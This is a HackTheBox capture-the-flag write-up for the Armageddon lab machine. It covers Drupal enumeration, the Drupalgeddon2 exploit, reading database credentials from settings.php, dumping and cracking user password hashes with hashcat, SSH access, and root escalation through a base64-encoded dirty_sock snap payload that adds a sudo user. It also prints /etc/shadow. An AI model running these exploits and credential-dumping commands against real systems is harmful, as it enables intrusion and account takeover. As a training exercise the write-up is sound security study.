---
title: "Armageddon - HTB"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2021-06-12 11:32:49 +05:30
categories: [Writeups, HackTheBox]
tags: [HTB, Drupal, MySQL]
render_with_liquid: false
---

## Recon & Enumeration

- `10.10.10.233`
- `nmap -Pn -p- -A 10.10.10.233`

```
10.10.10.233:22 => OpenSSH 7.4 
10.10.10.233:80 => Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

- Server headers from forwarding the same original URL as request through Burp Suite.

```
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
X-Generator: Drupal 7 (http://drupal.org)
```

- `whatweb 10.10.10.233`

```
http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```

### DroopeScan

- [DroopeScan](https://github.com/droope/droopescan) 
- `pip install droopescan`
- `droopescan scan drupal -u http://10.10.10.233` 

```
[+] Plugins found:
profile http://10.10.10.233/modules/profile/
php http://10.10.10.233/modules/php/
image http://10.10.10.233/modules/image/

[+] Themes found:
seven http://10.10.10.233/themes/seven/
garland http://10.10.10.233/themes/garland/

[+] Possible version(s):
7.56

[+] Possible interesting urls found:
Default changelog file - http://10.10.10.233/CHANGELOG.txt
```

---

## Exploitation

- `searchsploit drupal 7.56` 
- [Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution](https://www.exploit-db.com/exploits/44449) 
- If you get an error like: cannot load such file - highline/import (LoadError), you just need to install `highline` with `sudo gem install highline` to install the missing dependency. 
- I didn't know if any configuration files stored usernames and passwords on Drupal so I googled that and found out `sites/default/settings.php` was the file I should take a loot at. 
- `cat sites/default/settings.php` 

```php
# line 247
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

# line 293
$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
```


## Dumping Database

- `mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'`
- `mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'`
- `mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'`


```
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1623161165	1623160907	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
3	test	$S$D8C20y3tzyN8e40/uXm2ucL/aSg3nyhYwHu0BjLGWqHYMkv6XmvP	test@gmail.com			filtered_html	1623144258	0	0	0	Europe/London		0	test@gmail.com	NULL
4	fucker	$S$DDSgB/GK6gUnA/XspYNYKNGy8y0Mgkd6fzAqvgI8K.O66QTLtoC0	fucker@fuckityfuck.com			filtered_html	1623145756	0	0	0Europe/London		0	fucker@fuckityfuck.com	NULL
```

### Dumping Hashes

```
brucetherealadmin => $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
test => $S$D8C20y3tzyN8e40/uXm2ucL/aSg3nyhYwHu0BjLGWqHYMkv6XmvP
fucker => $S$DDSgB/GK6gUnA/XspYNYKNGy8y0Mgkd6fzAqvgI8K.O66QTLtoC0
```

- Lets copy them all to `crack.txt` and attempt to crack them with `hashcat`. 
- `hashid crack.txt -m` <span class="fat-arrow">=></span> 7900

```
hashcat -m 7900 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O
```

```
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
brucetherealadmin:booboo
```

- The credentials work not only on the website but also on SSH! 
- `ssh brucetherealadmin@10.10.10.233` <span class="fat-arrow">=></span> `booboo` 
- `cd /home/brucetherealadmin && ls` 
- `cat user.txt` 

```
2402a902------------cdc5e4307a76
```
  
## Privilege Escalation

- `sudo -l` 

```
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

- [GTFOBins sudo snap](https://gtfobins.github.io/gtfobins/snap/)

- [sudo snap](https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1) 

```
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
```

- `chmod +x payload.snap` 
- `sudo snap install payload.snap --dangerous --devmode` 
- This will create a user `dirty_sock:dirty_sock` with root privileges. 
- `su dirty_sock` <span class="fat-arrow">=></span> `dirty_sock` 
- `cat /root/root.txt` 

```
83598c--------------7dd817915
```
  
- `cat /etc/shadow` 

```
root:$6$OhKUwkvR$.uL.mlYJOz.ubK/FmXouGbU7vCVCG9s00K7R.ny9ryM.vXNdwZhOGCcq7e3XcbA5UpqUp.9eKY4hfLy9m5aU7/:18610:0:99999:7:::
```

